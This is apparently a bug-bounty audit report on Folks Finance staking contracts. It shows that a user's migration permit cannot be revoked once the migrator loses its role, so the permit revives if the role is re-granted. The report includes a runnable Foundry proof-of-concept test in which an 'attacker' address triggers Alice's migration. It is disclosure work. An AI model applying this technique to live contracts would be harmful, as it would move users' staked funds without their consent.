# 69463 sc low stale migration permits can be reactivated by re granting migrator role to a previously approved migrator

**Submitted on Mar 15th 2026 at 02:24:39 UTC by @Nescient for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69463
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

The README describes migration as "`User-controlled migration`" and states that "`No migration can happen without the user's active approval`" and that "`The permission can be revoked at any time by calling setMigrationPermit(migratorAddress, false).`" However, this is not true in all cases: if a user approved a migrator and that migrator later loses `MIGRATOR_ROLE`, the old permit remains stored but the user can no longer revoke it; if the same address is granted `MIGRATOR_ROLE` again later, the stale approval becomes active again without fresh user consent, exposing the user's open stakes to unintended migration.

## Vulnerability Details

This issue is different from the two acknowledged behaviors. It is not about a permit persisting after migration, and it is not merely about `migrationPermits` containing an address whose `MIGRATOR_ROLE` was revoked. The actual vulnerability is that once the role is revoked, the user loses the ability to clear that stale permit, so the old approval can later be reactivated simply by re-granting `MIGRATOR_ROLE` to the same address. In other words, the known issue is stale state existence; this report shows that the stale state is user-unrevocable and can become valid authorization again.

The issue is that `setMigrationPermit()` blocks both opt-in and opt-out behind the same role check:

```solidity
if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
```

At the same time, migration only requires the migrator to currently have `MIGRATOR_ROLE` and for the stored permit to still be `true`:

```solidity
onlyRole(MIGRATOR_ROLE)
if (!migrationPermits[msg.sender][user]) revert MigratorNotPermitted(msg.sender, user);
```

This creates the following stale-permission flow:

{% stepper %}
{% step %}

#### User approves migrator `M`

User approves migrator `M`.
{% endstep %}

{% step %}

#### Admin revokes `MIGRATOR_ROLE` from `M`

Admin revokes `MIGRATOR_ROLE` from `M`.
{% endstep %}

{% step %}

#### User tries to revoke approval

User tries to revoke approval, but `setMigrationPermit(M, false)` reverts because `M` no longer has the role.
{% endstep %}

{% step %}

#### Old permit remains stored

The old value in `migrationPermits[M][user]` remains true.
{% endstep %}

{% step %}

#### Role is re-granted

If `MIGRATOR_ROLE` is later re-granted to `M`, the old approval becomes usable again.
{% endstep %}
{% endstepper %}

So the problem is not just that permits persist after role revocation, but that users are prevented from clearing them during that period. This also contradicts the README statements that migration is user-controlled and that permission can be revoked at any time.

## Impact Details

This can re-activate old migration approvals without a new user opt-in, exposing all still-open stakes of affected users to unintended migration. In the provided example migrator, `migrate(user)` is permissionless, so once the role is restored any caller can trigger migration for users who still have a stale approval. The issue is best classified as a Low severity stale-authorization / broken-revocation vulnerability.

## References

`setMigrationPermit`: <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L77-L81\\>
`migratePositionsFrom` : <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L166-L172>

## Proof of Concept

Runnable proof of concept for the stale migration permit issue.

Flow:

{% stepper %}
{% step %}

#### Alice grants migration permission

Alice grants migration permission to a migrator while it has `MIGRATOR_ROLE`.
{% endstep %}

{% step %}

#### Admin revokes the role

Admin revokes `MIGRATOR_ROLE` from that migrator.
{% endstep %}

{% step %}

#### Alice can no longer revoke

Alice can no longer call `setMigrationPermit(migrator, false)`, so the old permit stays stored.
{% endstep %}

{% step %}

#### Admin grants the role back

Admin grants `MIGRATOR_ROLE` back to the same migrator address.
{% endstep %}

{% step %}

#### Migration can be triggered again

Any caller can trigger migration through the example `MigratorV1` using Alice's stale approval.
{% endstep %}
{% endstepper %}

You can copy the PoC below and run it using the following command:

```bash
forge test --match-test test_PoC_StaleMigrationPermitCanBeRevivedAfterRoleRegrant -vv
```

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.23;

import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";
import {MigratorV1} from "../src/test/MigratorV1.sol";
import {StakingV2Mock} from "../src/test/mock/StakingV2Mock.sol";

contract PoCToken is ERC20Permit {
    constructor() ERC20Permit("PoC Token") ERC20("PoC Token", "POC") {}
}

contract StaleMigrationPermitPoCTest is Test {
    Staking internal staking;
    StakingV2Mock internal stakingV2;
    MigratorV1 internal migrator;
    PoCToken internal token;

    address internal admin = address(0xA11CE);
    address internal manager = address(0xB0B);
    address internal pauser = address(0xCAFE);
    address internal alice = address(0xA71CE);
    address internal attacker = address(0xBEEF);

    bytes32 internal constant MIGRATOR_ROLE = keccak256("MIGRATOR");
    uint256 internal constant REWARD_RESERVE = 1_000 ether;
    uint256 internal constant STAKE_AMOUNT = 10 ether;
    uint64 internal constant STAKING_DURATION = 365 days;
    uint64 internal constant UNLOCK_DURATION = 1 days;
    uint32 internal constant APR_BPS = 1_000; // 10%

    function setUp() public {
        token = new PoCToken();
        staking = new Staking(admin, manager, pauser, address(token));
        stakingV2 = new StakingV2Mock(token);
        migrator = new MigratorV1(staking, stakingV2);

        // Seed the staking contract with reward liquidity and Alice with the amount she will stake.
        deal(address(token), address(staking), REWARD_RESERVE);
        deal(address(token), alice, STAKE_AMOUNT);

        // Create one active staking period so Alice has an open position to be migrated later.
        vm.prank(manager);
        staking.addStakingPeriod(type(uint256).max, STAKING_DURATION, UNLOCK_DURATION, APR_BPS, true);

        // The migrator contract itself is the address that needs MIGRATOR_ROLE.
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, address(migrator));

        vm.startPrank(alice);
        token.approve(address(staking), STAKE_AMOUNT);
        staking.stake(
            0,
            STAKE_AMOUNT,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: STAKING_DURATION,
                maxUnlockDurationSeconds: UNLOCK_DURATION,
                minAprBps: APR_BPS,
                referrer: address(0)
            })
        );
        vm.stopPrank();
    }

    function test_PoC_StaleMigrationPermitCanBeRevivedAfterRoleRegrant() public {
        IStakingV1.UserStake memory aliceStake = staking.getUserStake(alice, 0);
        uint256 expectedMigrationAmount = aliceStake.amount + aliceStake.reward;

        // Step 1: Alice approves the migrator while it legitimately has MIGRATOR_ROLE.
        vm.prank(alice);
        staking.setMigrationPermit(address(migrator), true);
        console2.log("permit after approval", staking.migrationPermits(address(migrator), alice));

        // Step 2: Admin revokes MIGRATOR_ROLE from the migrator.
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, address(migrator));

        // Step 3: Alice tries to revoke, but the call reverts because the migrator no longer has the role.
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, address(migrator)));
        vm.prank(alice);
        staking.setMigrationPermit(address(migrator), false);
        console2.log("permit after failed revoke", staking.migrationPermits(address(migrator), alice));

        // Step 4: Admin re-grants MIGRATOR_ROLE to the exact same migrator address.
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, address(migrator));

        // Step 5: Because MigratorV1.migrate(user) is permissionless, any caller can now trigger migration.
        uint256 v1BalanceBefore = token.balanceOf(address(staking));
        uint256 v2BalanceBefore = token.balanceOf(address(stakingV2));

        vm.prank(attacker);
        migrator.migrate(alice);

        uint256 v1BalanceAfter = token.balanceOf(address(staking));
        uint256 v2BalanceAfter = token.balanceOf(address(stakingV2));
        console2.log("v2 received", v2BalanceAfter - v2BalanceBefore);
        console2.log("alice stake count after migration", staking.getUserStakes(alice).length);

        // The assertions below make the PoC runnable and self-verifying.
        assertTrue(staking.migrationPermits(address(migrator), alice), "stale permit should still be present");
        assertEq(staking.getUserStakes(alice).length, 0, "Alice's position should have been migrated out of V1");
        assertEq(v1BalanceBefore - v1BalanceAfter, expectedMigrationAmount, "V1 should lose the full migrated value");
        assertEq(v2BalanceAfter - v2BalanceBefore, expectedMigrationAmount, "V2 should receive the full migrated value");
    }
}
```

The test passes successfully and the following is the console output:

```
 permit after approval true
 permit after failed revoke true
 v2 received 11000000000000000000
 alice stake count after migration 0
```
